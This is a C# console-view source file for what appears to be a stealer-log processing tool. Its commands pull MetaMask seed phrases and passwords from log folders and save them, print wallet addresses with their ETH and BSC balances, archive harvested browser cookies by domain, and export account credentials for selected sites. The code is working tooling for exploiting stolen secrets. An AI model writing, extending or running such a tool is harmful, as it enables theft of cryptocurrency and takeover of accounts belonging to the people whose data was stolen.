using Console.Models;
using Console.Models.Abstractions;
using Console.Models.Attributes;
using Console.Models.Views;
using Core.Models.Configs;
using Core.Parsers;
using Core.Wallets;

namespace Console.Views;

public class MainView(IRoot root, Settings settings, DataService data, Web3Config cfgWeb3, ParsingConfig cfgParse)
    : ArgsView(root)
{
    [Command, Redirect]
    public Task Services() => Task.Run(() => Root.PushRedirect<ServicesView>());
    
    // [Command]
    public async Task Wallets()
    {
        var checker = new MetamaskChecker(cfgWeb3.Eth, cfgWeb3.Bsc);
        var wallets = new MetamaskParser().ByLogs(settings.Path);

        await data.SaveAsync("mnemonics", wallets.Select(x => x?.Mnemonic).Distinct());
        
        foreach (var wallet in wallets)
        {
            if (wallet is not {Mnemonic:not null, Password:not null} ||
                wallet.Mnemonic.Split(' ').Length != 12) continue;
            
            System.Console.WriteLine(wallet.Mnemonic);
            
            foreach (var account in wallet.Accounts.Values.OrderBy(x => x.Name))
            {
                System.Console.WriteLine(account.Name);
                System.Console.WriteLine(account.Address);
                
                foreach (var balance in await checker.Balance(account.Address))
                {
                    System.Console.WriteLine($"{balance.Key}: {balance.Value}");
                }
            }
        }

        _ExitWait();
    }

    [Command]
    public async Task Links()
    {
        await data.SaveAsync("links", cfgParse.Links.LinksFromLogs(settings.Path).Select(x => x.ToString()));

        _ExitWait();
    }

    [Command]
    public async Task Cookies()
    {
        var result = cfgParse.Cookies.CookiesFromLogs(settings.Path);
        
        foreach (var (domain, cookies) in result)
        {
            await data.SaveZipAsync("cookies", domain, cookies.ToArray());
        }

        _ExitWait();
    }
    
    [Command]
    public async Task Accounts()
    {
        if (cfgParse.Accounts.Count == 0) return;
        
        var domains = await Root.Show(new PickView<string[]>(cfgParse.Accounts));
        var accounts = domains.AccountsFromLogs(settings.Path);
        
        foreach (var (domain, account) in accounts)
        {
            await data.SaveAsync(domain, account.Select(x => x.ToStringShort()).Distinct());
        }

        _ExitWait();
    }
}